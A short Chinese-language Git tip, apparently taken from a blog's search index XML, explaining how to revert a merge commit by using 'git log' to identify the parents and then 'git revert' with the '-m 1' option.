<h3 id="revert-一个-merge-commit"><a href="#revert-一个-merge-commit" class="headerlink" title="revert 一个 merge commit"></a>revert 一个 merge commit</h3><ul>
<li>如果 git merge 并提交了 commit，但发现提交是错误的想撤回这个 merge commit，此时就不能用 <code>git revert [commitId]</code> 了。<br>正确步骤如下：</li>
</ul>
<ol>
<li><p><code>git log</code>查看merge commit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commit 01a84b7a7218b49980c626d8a0e094aaf992e589 (HEAD -&gt; dev_2-4-0_200812_2.4.15)</span><br><span class="line">Merge: 82bbbde5 cdaab15f</span><br><span class="line">// 这里的 Merge 第一个commit表示当前执行merge操作的分支，第二个 commit 表示被merge的分支。</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>git revert 01a84b7a7 -m 1</code> -m 后的 1 表示上一步 Merge 里的第一个 commit 即当前分支。此时已经处理完毕执行 git push 即可。</p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Git </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
